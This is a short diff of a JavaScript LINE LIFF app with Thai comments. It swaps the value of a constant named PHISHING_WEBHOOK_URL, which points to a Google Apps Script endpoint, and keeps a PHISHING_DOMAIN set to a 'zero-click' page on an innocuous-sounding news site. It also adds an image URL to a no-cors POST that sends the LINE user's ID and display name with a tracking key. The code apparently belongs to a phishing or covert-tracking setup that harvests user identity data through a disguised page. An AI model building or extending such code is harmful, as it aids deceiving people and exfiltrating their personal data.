@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzHJWwjlntch8ygzLMY1T3efRE2KuaD881NaPGpNsnV6Nq8FosWDokUmF-yw37hF665/exec'; // ไฟล์ GoogleScript.html.
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwo9f8C8sABEYSJLSTCPx64WUNbndFeiKN_gCFlMkOgvomk6PxGNPa2pjUi96z3LW6_cQ/exec'; // ไฟล์ GoogleScript.html
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -754,9 +754,10 @@
                         caseName: caseName,
                         creatorId: userId,
                         creatorName: displayName,
+                        imageUrl: imageUrl, // <-- Add the image URL here
                         requestId: generateUniqueId()
                     }),
-                    mode: 'no-cors'
+                    mode: 'no-cors' // Note: 'no-cors' might hide errors from the server. Consider changing if debugging server issues.
                 });
                 
                 console.log('บันทึก Tracking Key สำเร็จ');
